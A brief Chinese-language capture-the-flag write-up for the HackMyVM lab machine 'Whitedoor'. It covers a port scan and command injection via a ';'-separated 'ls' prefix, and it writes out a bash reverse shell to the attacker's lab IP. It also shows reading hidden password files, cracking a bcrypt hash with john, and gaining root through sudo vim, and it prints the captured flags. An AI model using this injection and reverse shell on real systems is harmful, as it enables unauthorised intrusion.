# Whitedoor

2025.03.17 https://hackmyvm.eu/machines/machine.php?vm=Whitedoor

[video](https://www.bilibili.com/video/BV1MPQvYUEdv/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

ftp 没有用信息。

80 web 上可以执行命令，但是需要 ls 开头，这里使用;分割命令:

```
ls /etc/;/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"
```

拿到 web shell。

枚举发现其他普通用户密码：

```
www-data@whitedoor:/home/whiteshell$ cat /home/whiteshell/Desktop/.my_secret_password.txt
whiteshell:VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K
```

su 切换到 whiteshell , 对 VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K 进行 2 次 base64 解码得到: Th1sIsTh3P4sSwOrDblac5

发现另外一个用户的密码哈希:

```
whiteshell@whitedoor:/home/Gonzalo/Desktop$ cat /home/Gonzalo/Desktop/.my_secret_hash
$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6
```

john 解密哈希得到密码 qwertyuiop 切换到 Gonzalo 用户。

先拿到 user flag:

```
Gonzalo@whitedoor:~$ cat Desktop/user.txt
Y0uG3tTh3Us3RFl4g!!
```

sudo 显示 vim 直接提权到 root:

```
Gonzalo@whitedoor:~$ sudo -l
Matching Defaults entries for Gonzalo on whitedoor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User Gonzalo may run the following commands on whitedoor:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
Gonzalo@whitedoor:~$ sudo /usr/bin/vim

root@whitedoor:/home/Gonzalo# cd /root
root@whitedoor:~# ls
root.txt
root@whitedoor:~# cat root.txt
Y0uAr3Th3B3sTy0Ug3Tr0oT!!
```
